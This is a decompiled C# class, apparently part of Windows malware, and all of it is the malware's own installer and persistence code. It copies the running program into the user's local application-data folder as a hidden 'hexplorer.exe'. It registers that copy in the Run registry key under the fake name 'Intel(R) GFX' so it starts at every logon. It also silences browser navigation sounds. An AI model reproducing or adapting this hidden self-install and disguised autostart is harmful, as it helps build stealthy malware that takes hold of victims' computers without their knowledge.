using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace ns2;

internal class Class3
{
	private const string string_0 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	private const int int_0 = 21;

	private const int int_1 = 2;

	public static string string_1 = "Intel(R) GFX";

	public static string string_2 = "hexplorer.exe";

	[DllImport("urlmon.dll")]
	[return: MarshalAs(UnmanagedType.Error)]
	private static extern int CoInternetSetFeatureEnabled(int FeatureEntry, [MarshalAs(UnmanagedType.U4)] int dwFlags, bool fEnable);

	public static void smethod_0()
	{
		CoInternetSetFeatureEnabled(21, 2, fEnable: true);
	}

	public static void smethod_1(string src, string dst)
	{
		if (File.Exists(dst))
		{
			File.SetAttributes(dst, FileAttributes.Normal);
		}
		try
		{
			File.Copy(src, dst, overwrite: true);
		}
		catch (Exception)
		{
		}
		File.SetAttributes(dst, FileAttributes.Hidden);
	}

	public static void smethod_2(string name, string path)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(name, path);
			registryKey.Close();
		}
	}

	public static void smethod_3()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		if (!(Path.GetDirectoryName(location) == folderPath))
		{
			smethod_1(location, folderPath + "\\" + string_2);
		}
	}
}
